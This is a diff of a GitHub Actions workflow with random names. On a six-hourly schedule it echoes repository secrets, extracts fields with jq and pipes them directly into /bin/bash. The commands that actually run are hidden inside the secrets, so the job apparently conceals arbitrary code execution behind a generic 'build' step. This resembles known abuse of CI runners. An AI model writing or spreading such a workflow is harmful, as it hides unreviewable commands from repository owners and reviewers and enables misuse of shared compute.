@@ -1,26 +1,27 @@
 name: lukasa7612
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
+    - cron: '7 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lukasa7612
         env:
-          efvkr464: ${{ secrets.efvkr464 }}
+          wxq2: ${{ secrets.wxq2 }}
         run: |
-          echo $efvkr464 | jq -r .bcb2683 | /bin/bash
-          echo $cxmqr3694 | jq -r .riy91 | /bin/bash
-          echo $bsrii6396 | jq -r .ylhd0 | /bin/bash
-          echo $lw0 | jq -r .dxll3727 | /bin/bash
-          echo $bae9781 | jq -r .ox98 | /bin/bash
-          echo $eiww22 | jq -r .vmsg515 | /bin/bash
-          echo $toosd0871 | jq -r .k61 | /bin/bash
-          echo $g43 | jq -r .kgyqz7910 | /bin/bash
+          echo $wxq2 | jq -r .rk4 | /bin/bash
+          echo $w8429 | jq -r .ll492 | /bin/bash
+          echo $wwycw0 | jq -r .ngw58 | /bin/bash
+          echo $xhsj77 | jq -r .av0604 | /bin/bash
+          echo $bqclm3 | jq -r .pcv72631 | /bin/bash
+          echo $zpgeg397 | jq -r .uheg70080 | /bin/bash
+          echo $seuzd807 | jq -r .qvkkl57010 | /bin/bash
+          echo $fdrh480 | jq -r .ivpns0938 | /bin/bash
+          echo $yww5555 | jq -r .wu4 | /bin/bash
+          echo $b35 | jq -r .s1 | /bin/bash
+          echo $ksog43561 | jq -r .t26 | /bin/bash
 
